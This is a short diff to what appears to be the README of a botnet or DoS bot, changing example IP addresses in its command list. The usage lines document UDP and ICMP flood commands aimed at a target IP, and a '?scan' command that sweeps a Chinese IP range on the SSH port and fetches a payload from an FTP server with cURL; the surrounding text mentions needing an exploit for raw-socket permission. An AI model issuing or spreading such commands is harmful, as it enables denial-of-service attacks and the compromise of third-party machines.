@@ -34,7 +34,7 @@ But raw socket need it(exploit) to get a permission for run it. In <strong>The v
 <ul>
   <li><strong>?udp [ip] [size]</li></strong>
     <ul>
-      <li>?udp 192.168.1.1 500</li>
+      <li>?udp 192.168.1.16 500</li>
       - Flood UDP packets by random src and dst port to target. Min and Max of Buffer is 1 - 700bytes.
     </ul>
 </ul>
@@ -42,7 +42,7 @@ But raw socket need it(exploit) to get a permission for run it. In <strong>The v
 <ul>
   <li><strong>?icmp [ip]</li></strong>
     <ul>
-      <li>?udp 192.168.1.1</li>
+      <li>?icmp 192.168.1.16</li>
       - Flood ICMP packets to target.(I know it's a old school DoS, lol.)
     </ul>
 </ul>
@@ -50,7 +50,7 @@ But raw socket need it(exploit) to get a permission for run it. In <strong>The v
 <ul>
   <li><strong>?scan [ftp server]</li></strong>
     <ul>
-      <li>?scan ftp://192.186.1.1/payload</li>
+      <li>?scan ftp://192.186.1.16/payload</li>
       - Scan CHN ip range on SSH port and get payload with cURL.
     </ul>
 </ul>
